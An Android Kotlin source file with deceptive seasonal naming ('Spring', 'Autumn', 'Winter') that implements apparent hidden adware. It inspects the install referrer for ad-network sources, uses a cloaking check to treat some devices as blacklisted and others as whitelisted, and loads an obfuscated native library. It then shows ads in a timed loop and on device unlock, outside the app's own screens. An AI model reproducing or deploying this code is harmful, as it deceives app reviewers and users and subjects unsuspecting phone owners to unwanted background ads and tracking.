package com.autumn.leaves

import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.PowerManager
import com.autumn.leaves.broad.AutoReceiver
import com.autumn.leaves.flows.AcornBroadcast
import com.autumn.leaves.flows.CrispFlows
import com.autumn.leaves.ss.ListenerShowEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.Locale

/**
 * Date：2024/7/1
 * Describe:
 */

class CozyApple(val context: Context, private val leaversCache: LeaversCache) : ListenerShowEvent {
    private var mAutumnL by AppleCache(nameP = "autumn_length", defApple = "1")

    private var scopeMain: CoroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    private var isWaitInstallSuccess = false
    private var mCozyJob: Job? = null
    private val isAreaCountryCozy: Boolean
        get() = arrayListOf(
            "SG", "US", "IN", "KE"
        ).find { it == Locale.getDefault().country } != null

    private var isActionAutumn = false

    fun registerCozy() {
        context.registerReceiver(AutoReceiver(), IntentFilter().apply {
            addAction("android.net.conn.CONNECTIVITY_CHANGE")
            addAction("android.net.wifi.STATE_CHANGE")
            addAction("android.intent.action.MEDIA_EJECT")
            addAction("android.intent.action.MEDIA_MOUNTED")
        })
        mCozyJob = CoroutineScope(Dispatchers.Default).launch {
            CrispFlows.flowLevel.collect {
                WindHelper.log("registerCozy---$it")
                when (it) {
                    "Spring" -> {
                        springAction()
                    }

                    "Summer" -> {
                        summerAction()
                    }

                    "Autumn" -> {
                        if (isActionAutumn.not()) {
                            System.loadLibrary("UF2GKabJcWtSH")
                            isActionAutumn = true
                            if (isWaitInstallSuccess) {
                                CrispFlows.isStop = true
                                mCozyJob?.cancel()
                            }
                            autumnAction()
                        }
                    }

                    "wait_finish" -> {
                        isWaitInstallSuccess = true
                        if (isActionAutumn) {
                            CrispFlows.isStop = true
                            mCozyJob?.cancel()
                        }
                    }

                    "Winter1", "Winter2" -> {
                        CrispFlows.isStop = true
                        mCozyJob?.cancel()
                    }
                }
            }
        }
    }

    private fun springAction() {
        if (WindHelper.mReferrer.isNotBlank()) {
            ArrayList(CrispFlows.listStr).forEach {
                if (isAreaCountryCozy.not() || it == "adjust" || it == "bytedance") {
                    if (WindHelper.mReferrer.contains(it)) {
                        postUseE(it)
                        return
                    }
                }
            }
        }

        if (CrispFlows.autumnUser()) {
            postUseE("adjust1")
            return
        }
        if (CrispFlows.mNetworkStr.isNotBlank() && WindHelper.mReferrer.isNotBlank() && WindHelper.mCloakInfo.isNotBlank()) {
            CrispFlows.curCrispLevel = "Winter1"
        }
    }

    private fun postUseE(string: String) {
        WindHelper.eventPost("isuser", mapOf("getstring" to string))
        CrispFlows.curCrispLevel = "Summer"
        summerAction()
    }

    private fun summerAction() {
        if (winterU()) {
            CrispFlows.curCrispLevel = "Winter2"
        } else if (autumnW()) {
            CrispFlows.curCrispLevel = "Autumn"
            WindHelper.eventPost("ishit")
        }
    }

    private fun winterU(): Boolean {
        //  黑名单
        return WindHelper.mCloakInfo == "obduracy"
    }


    private fun autumnW(): Boolean {
        //  白名单
        return WindHelper.mCloakInfo == "palfrey"
    }

    private var mTimerRequest = true

    private fun autumnAction() {
        if (mAutumnL.length > 100) {
            return
        }
        CoroutineScope(Dispatchers.Main).launch {
            while (CrispFlows.isInMainPage) {
                delay(500)
            }
            CrispFlows.crispEvent(context, "hwsod")
            context.registerReceiver(AcornBroadcast {
                if (mAutumnL.length < 100) {
                    WindHelper.eventPost("time_charge")
                    action(true)
                }
            }, IntentFilter().apply {
                addAction(Intent.ACTION_USER_PRESENT)
            })


            leaversCache.mListenerShowEvent = this@CozyApple
            WindHelper.setEventNumToMax()
            leaversCache.isStopRequestCircle = true
            while (mTimerRequest) {
                leaversCache.loadTrad()
                WindHelper.eventPost("time")
                action(false)
                WindHelper.timeCheckDelay()
            }
        }
    }

    private var lastShowSuccessTime = 0L

    private var waitShow = false
    private var cheJob: Job? = null

    private fun action(isBro: Boolean) {
        WindHelper.log("action--->$mAutumnL")
        if (mAutumnL.length > 100) {
            mTimerRequest = false
            WindHelper.eventPost("jumpfail")
            return
        }
        if (isDeviceLockInfo(context).not()) return
        WindHelper.eventPost("isunlock")

        if (isWaitInstallSuccess.not() && WindHelper.isFlowWaitFinish().not()) {
            return
        }
        if (WindHelper.windStatus.contains("a_s_pp", true)) return
        if (isBro.not() && System.currentTimeMillis() - lastShowSuccessTime < WindHelper.timeShowPAutumn) return

        WindHelper.eventPost("ispass")

        if (leaversCache.isCanUse() != null) {
            scopeMain.launch(Dispatchers.Main) {
                cheJob?.cancel()
                lastShowSuccessTime = System.currentTimeMillis()
                WindHelper.eventPost("isready")
                if (leaversCache.finishActivity() > 0) {
                    delay(201)
                }
                withContext(Dispatchers.IO) {
                    mAutumnL += ('a'..'m').random()
                    CrispFlows.crispEvent(context, "lolvns")
                }
            }
        } else {
            cheJob?.cancel()
            cheJob = scopeMain.launch(Dispatchers.Main) {
                waitShow = true
                leaversCache.loadAndTry()
                val max = (WindHelper.getTimeCheckTime() / 1000) - 2
                var num = 0
                while (num < max && waitShow) {
                    delay(1000)
                    WindHelper.log("wait ad ---->")
                    if (leaversCache.isCanUse() != null && waitShow) {
                        loadedSuccess()
                        break
                    }
                    num++
                }
            }
        }
    }

    //DeviceNotLocked
    private fun isDeviceLockInfo(context: Context): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    override fun showStart() {
        mAutumnL = ""
    }

    override fun showFailed() {
        lastShowSuccessTime = 0
    }

    override fun loadedSuccess() {
        WindHelper.log("loadedSuccess--->$waitShow")
        if (waitShow) {
            waitShow = false
            cheJob?.cancel()
            action(false)
        }
    }


}